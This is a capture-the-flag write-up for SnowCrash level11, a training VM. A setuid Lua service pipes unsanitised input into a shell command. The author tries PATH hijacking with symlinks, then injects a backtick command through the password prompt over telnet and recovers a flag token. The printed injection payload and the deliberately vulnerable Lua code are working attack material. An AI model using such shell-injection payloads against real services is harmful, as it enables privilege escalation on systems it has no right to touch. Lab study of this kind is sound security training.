# Start

```sh
level11@SnowCrash:~$ ll
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*
```
> effective user flag11

```lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
> with https://crackstation.net/ the hash == NotSoEasy

`#!/usr/bin/env lua` is interesting, the lua bin is serach in the PATH of #!/usr/bin/env

```sh
level11@SnowCrash:~$ ln -s /bin/getflag /tmp/lua
level11@SnowCrash:~$ export PATH="/tmp:$PATH"
level11@SnowCrash:~$ ./level11.lua 
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
>don't work because not the same env

```sh
level11@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```
> I try to exec the `echo` in the `hash` function, to interpret variable with rights. So I have to find a way to get in

```sh
level11@SnowCrash:~$ netstat -tln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
<tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     >
tcp6       0      0 :::4646                 :::*                    LISTEN     
tcp6       0      0 :::4747                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::4242                 :::*                    LISTEN 
```
```sh
level11@SnowCrash:~$ netstat -tl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 *:4242                  *:*                     LISTEN     
<tcp        0      0 localhost:pcrd          *:*                     LISTEN       >
tcp6       0      0 [::]:4646               [::]:*                  LISTEN     
tcp6       0      0 [::]:4747               [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:4242               [::]:*                  LISTEN 
```

https://www.gabinhocity.eu/wp-content/uploads/2015/10/liste-des-ports-TCP-et-UDP.pdf

https://www.crc.id.au/pcrd-pcr1000-on-linux/

http://www.penguintutor.com/linux/services-tcp-udp-port-numbers-quickreference

`pcrd		5151/tcp			# PCR-1000 Daemon`

```sh
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: NotSoEasy
Erf nope..
Connection closed by foreign host.
```
> Same response as the lua script

## Exploit

```sh
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag` > /tmp/css
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/css
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```